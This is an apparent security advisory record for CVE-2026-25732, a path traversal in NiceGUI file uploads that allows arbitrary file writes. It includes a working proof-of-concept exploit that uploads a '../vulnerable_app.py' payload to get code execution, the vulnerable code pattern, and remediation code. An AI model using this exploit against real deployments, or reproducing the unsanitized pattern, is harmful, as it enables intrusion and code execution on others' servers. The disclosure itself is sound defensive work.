advisory_id: GHSA-9ffm-fxg3-xrhh
datasource_id: github_osv_importer_v2/GHSA-9ffm-fxg3-xrhh
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-9ffm-fxg3-xrhh/GHSA-9ffm-fxg3-xrhh.json
aliases:
  - CVE-2026-25732
summary: "NiceGUI's Path Traversal via Unsanitized FileUpload.name Enables Arbitrary File Write\n\
  ### Summary\nNiceGUI's `FileUpload.name` property exposes client-supplied filename metadata\
  \ without sanitization, enabling path traversal when developers use the pattern `UPLOAD_DIR\
  \ / file.name`. Malicious filenames containing `../` sequences allow attackers to write files\
  \ outside intended directories, with potential for remote code execution through application\
  \ file overwrites in vulnerable deployment patterns. This design creates a prevalent security\
  \ footgun affecting applications following common community patterns.\n\n**Note**: Exploitation\
  \ requires application code incorporating `file.name` into filesystem paths without sanitization.\
  \ Applications using fixed paths, generated filenames, or explicit sanitization are not affected.\n\
  \n### Details\n**Vulnerable Component**: `nicegui/elements/upload_files.py` ([upload_files.py#L79-L82](https://github.com/zauberzeug/nicegui/blob/main/nicegui/elements/upload_files.py#L79-L82)\
  \ and [upload_files.py#L110-L115](https://github.com/zauberzeug/nicegui/blob/main/nicegui/elements/upload_files.py#L110-L115))\n\
  \n**Affected Methods**: `SmallFileUpload.save()`and `LargeFileUpload.save()`\n\n```py\nasync\
  \ def save(self, path: str | Path) -> None:\n    target = Path(path)\n    target.parent.mkdir(parents=True,\
  \ exist_ok=True)\n    await run.io_bound(target.write_bytes, self._data)\n```\n\n**Root Cause**:\
  \ The `save()` method performs no validation on the provided path parameter. It accepts:\n\
  - Relative paths with `../` sequences\n- Absolute paths\n- Any file system location writable\
  \ by the process\n\nWhen developers use `e.file.name` (controlled by the attacker) in constructing\
  \ save paths, directory traversal occurs:\n```py\nsave_path = UPLOAD_DIR / e.file.name  #\
  \ e.file.name = \"../app.py\"\nawait e.file.save(save_path)           # Writes outside UPLOAD_DIR\n\
  ```\n\n### PoC\n- Terminal 1 (App)\n```bash\ncd /tmp && mkdir -p evilgui && cd evilgui\npython3\
  \ -m venv evilgui && source evilgui/bin/activate\npip install nicegui\n\ncat > vulnerable_app.py\
  \ << 'EOF'\nfrom nicegui import ui\nfrom pathlib import Path\n\nUPLOAD_DIR = Path('./uploads')\n\
  UPLOAD_DIR.mkdir(exist_ok=True)\n\n@ui.page('/')\ndef index():\n    async def handle_upload(e):\n\
  \        save_path = UPLOAD_DIR / e.file.name\n        await e.file.save(save_path)\n    \
  \    ui.notify(f'File saved: {e.file.name}')\n    \n    ui.upload(on_upload=handle_upload,\
  \ auto_upload=True)\n\nui.run(port=8080, reload=False)\nEOF\n\npython3 vulnerable_app.py &\n\
  ```\n\n- Terminal 2 (Exploit)\n```bash\ncat > exploit.py << 'EOF'\nimport requests, re, time\n\
  \ns = requests.Session()\ns.get('http://localhost:8080')\ntime.sleep(2)\n\nhtml = s.get('http://localhost:8080').text\n\
  match = re.search(r'/_nicegui/client/([^/]+)/upload/(\\d+)', html)\nupload_url = f'http://localhost:8080/_nicegui/client/{match[1]}/upload/{match[2]}'\n\
  \npayload = '''from nicegui import ui\nimport subprocess\n@ui.page(\"/\")\ndef index():\n\
  \    ui.label(subprocess.check_output([\"id\"], text=True))\nui.run(port=8080, reload=False)\n\
  '''\n\ns.post(upload_url, files={'file': ('../vulnerable_app.py', payload, 'text/x-python')})\n\
  EOF\n\npython3 exploit.py\n```\n- Restart the application to execute the injected code:\n\
  ```\npkill -f vulnerable_app && python3 vulnerable_app.py\n```\n- Observe http://localhost:8080\n\
  \n### Impact\n**Affected Applications**: All NiceGUI applications using `ui.upload()` where\
  \ developers save files with `e.file.save()` and include user-controlled filenames (e.g.,\
  \ `e.file.name`) in the path.\n\n**Attack Capabilities**:\n- Write files to any location writable\
  \ by the application process\n- Overwrite Python application files to achieve remote code\
  \ execution upon restart\n- Overwrite configuration files to alter application behavior\n\
  - Write SSH keys, systemd units, or cron jobs for persistent access\n- Deny service by corrupting\
  \ critical files\n\n**Exploitability**: Trivially exploitable without authentication. Attackers\
  \ simply upload a file with a malicious filename like `../../../app.py` to escape the upload\
  \ directory. The vulnerability is prevalent in production applications as developers naturally\
  \ use `e.file.name` directly, following patterns shown in community examples.\n\n### Remediation\n\
  #### For Users\n```py\nasync def handle_upload(e):\n    safe_name = Path(e.file.name).name\
  \ # Strip directory components!\n    await e.file.save(UPLOAD_DIR / safe_name)\n```\n\n####\
  \ For Maintainers\n```py\nasync def save(self, path: str | Path, *, base_dir: Path | None\
  \ = None) -> None:\n    target = Path(path).resolve()\n    \n    if base_dir is not None:\n\
  \        base_dir = base_dir.resolve()\n        if not target.is_relative_to(base_dir):\n\
  \            raise ValueError(\n                f\"Path '{target}' escapes base directory\
  \ '{base_dir}'\"\n            )\n    \n    target.parent.mkdir(parents=True, exist_ok=True)\n\
  \    await run.io_bound(target.write_bytes, self._data)\n````"
impacted_packages:
  - purl: pkg:pypi/nicegui
    affected_versions: vers:pypi/<=3.6.1
    fixed_versions: vers:pypi/3.7.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-9ffm-fxg3-xrhh/GHSA-9ffm-fxg3-xrhh.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-601
  - CWE-22
references:
  - url: https://github.com/zauberzeug/nicegui
    reference_type:
    reference_id:
  - url: https://github.com/zauberzeug/nicegui/blob/main/nicegui/elements/upload_files.py#L110-L115
    reference_type:
    reference_id:
  - url: https://github.com/zauberzeug/nicegui/blob/main/nicegui/elements/upload_files.py#L79-L82
    reference_type:
    reference_id:
  - url: https://github.com/zauberzeug/nicegui/security/advisories/GHSA-9ffm-fxg3-xrhh
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-25732
    reference_type:
    reference_id:
